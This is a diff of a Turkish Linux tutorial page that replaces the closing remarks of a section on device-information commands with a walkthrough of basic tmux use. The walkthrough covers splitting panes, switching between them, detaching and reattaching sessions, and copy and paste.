+![tmux-vertical.webp]({{ site.url }}/egitim/temel-linux/network/tmux-vertical.webp){:class="responsive img-zoomable"}
 
-En nihayetinde bence komut satırı üzerinden mevcut sistemin aygıtları hakkında bilgi almak için bu bahsetmiş olduğumuz komutlar çoğu durumda yeterli. 
+Eğer yatay olarak bölüp yeni konsol oturumu eklenecekse <kbd>Ctrl</kbd> + <kbd>B</kbd> tuşuna bastıktan sonra tırnak işaretini <kbd>“</kbd> oluşturan tuşa basıyoruz.
 
-Ben özellikler değinmeyeceğim ama hem bu bahsetmiş olduğumuz komutların ek seçenekleri hem de ayrıca bir çok aygıt hakkında bilgi sunan ek komutlar da mevcut. Merak ediyorsanız biraz araştırma ile diğer komutları ve seçeneklere kolayca ulaşabilirsiniz. Örneğin bizim bahsetmiş olduğumuz komutların yardım sayfalarına bakarak diğer seçenekler hakkında bilgi sahibi olup, sonuçlarını bizzat test ederek gözlemleyebilirsiniz. 
+![tmux-horizontal.webp]({{ site.url }}/egitim/temel-linux/network/tmux-horizontal.webp){:class="responsive img-zoomable"}
 
-Bu bölümde ele aldığımız komutlar genel bilgi alma komutları olduğu için çok fazla üzerine düşüp uzun açıklamalar yapmak istemedim çünkü pek çok farklı türde bilgi sunan komutları ele aldığımız için detaylıca bahsetmeye kalksaydık bu bölüm çok uzun sürebilirdi. Üstelik çoğu ek araç temel sistem yönetimi için bilmenizin şart olmadığı ek bilgi araçları. Ben sadece en temel bilgi alma komutlarının en temel işlevlerini odaklandım. Bu sayede daha fazlası için gerektiğinde yardım sayfaları ve internet araştırması ile tüm sorularınıza yanıt bulabilirsiniz.
+Bu konsollar arasında geçiş yapmak için <kbd>Ctrl</kbd> + <kbd>B</kbd> tuşuna bastıktan sonra klavyemizdeki sağ sol yön tuşları ile ilgili konsol oturumuna geçiş yapabiliyoruz. Zaten hangi konsolda olduğunuzu, pencereleri birbirinden ayıran renkli çizgi sayesinde takip edebilirsiniz. 
+
+![tmux-new-sessions.gif]({{ site.url }}/egitim/temel-linux/network/tmux-new-sessions.gif){:class="responsive img-zoomable"}
+
+Eğer bir oturumu sonlandırmak istiyorsanız üzerinde bulunduğunuz `tmux` oturumunu `exit` komutunu girerek kapatabilirsiniz. 
+
+![tmux-exit.gif]({{ site.url }}/egitim/temel-linux/network/tmux-exit.gif){:class="responsive img-zoomable"}
+
+Konsol oturumunu sonlandırmak yerine, ilgili konsolun arkaplanda çalışmaya devam etmesini sağlayıp bu konsol oturumundan geçici süreliğine ayrılmanız da mümkün. Örneğin ben denemek için `tmux` komutunu girip yeni bir konsol oturumu başlatıyorum. Ve bu oturumda `top` komutunu çalıştırıyorum. Normalde eğer konsol kapanacak olursa bu `top` aracı da kapanacağı için çalışmayı sürdürmeyecek. Fakat ben oturumu tamamen kapatmak yerine oturumdan ayrılmak için <kbd>Ctrl</kbd> + <kbd>B</kbd> tuşlamasını yapıp <kbd>D</kbd> tuşuna basıyorum. Buradaki <kbd>D</kbd> tuşu “**detach**” yani “**ayırmak**” ifadesinden gelen bir kısaltma. Bu sayede konsoldaki hiç bir işlem sonlandırılmadan biz konsoldan ayrılmış oluyoruz. Ayrıldığımız oturumları görmek için de `tmux list-sessions` komutunu kullanıyoruz.
+
+![tmux-detach.gif]({{ site.url }}/egitim/temel-linux/network/tmux-detach.gif){:class="responsive img-zoomable"}
+
+Ayrıldığımız oturumlara geri dönmek için `tmux attach` komutunu kullanabiliyoruz. 
+
+![tmux-attach.gif]({{ site.url }}/egitim/temel-linux/network/tmux-attach.gif){:class="responsive img-zoomable"}
+
+Eğer ayrıldığımız birden fazla oturum varsa geçiş yapmak istediğimiz oturumu `tmux attach -t oturum-sayısı` komutuyla özel olarak belirtmemiz gerekiyor.
+
+![tmux-multi-sessions.gif]({{ site.url }}/egitim/temel-linux/network/tmux-multi-sessions.gif){:class="responsive img-zoomable"}
+
+Bu yaklaşım sayesinde oturumlarda gerçekleştirilen işlemler sonlandırılamadan, başka konsol oturumlarında çalışabiliyoruz. Örneğin bir konsolda ssh ile bağlantı sağlayıp işlemler gerçekleştiriyorken, bu şekilde konsoldan ayrıldığımızda ssh bağlantısı ve tabii ilgili işlemler arkaplanda devam edecek. Biz de dilediğimiz zaman bu konsol oturumuna dönebileceğiz. 
+
+Bu esnek kullanım özelliğine ek olarak, konsol üzerinde kopyalama ve yapıştırma gibi işlemleri gerçekleştirmemiz de mümkün. Bu özellik, komutu satırı arayüzünde çalışan tty konsolları üzerinde çalışmamız gerektiğinde, fare kullanamadığımızda işimizi inanılmaz kolaylaştırıyor. 
+
+Kopyalamak için <kbd>Ctrl</kbd> + <kbd>B</kbd> tuşlamasından sonra <kbd>[</kbd> sembolünü temsil den tuşlamayı yapıyoruz. Bu noktadan itibaren imlecimizi mevcut konsol yazıları üzerinde yön tuşları ile rahatça hareket ettirebiliyoruz. Kopyalamak istediğimiz bölümün başına yön tuşları ile geldikten sonra seçme işlemi için <kbd>Ctrl</kbd> + <kbd>Space</kbd> tuşuna bastıktan sonra yine yön tuşları ile ilgili yazı seçiyoruz. Seçme işlemi bittikten sonra <kbd>Ctrl</kbd> + <kbd>W</kbd> tuşu ile seçili metni kopyalıyoruz. 
+
+Kopyalanmış olan metni yapıştırmak için de <kbd>Ctrl</kbd> + <kbd>B</kbd> tuşlamasından sonra <kbd>]</kbd> sembolünü temsil eden tuşlamayı yapmamız yeterli oluyor. 
+
+![tmux-copy-paste.gif]({{ site.url }}/egitim/temel-linux/network/tmux-copy-paste.gif){:class="responsive img-zoomable"}
+
+`tmux` aracının en temel kullanımı bu şekilde. Tabii ki aracın kullanımı ve konfigürasyonuna dair pek çok ek ayrıntı mevcut fakat temel kullanım amacı için burada bahsetmiş olduğumuz kadarlık bilgi yeterli. Daha fazlası için ek araştırma yapmakta özgürsünüz.
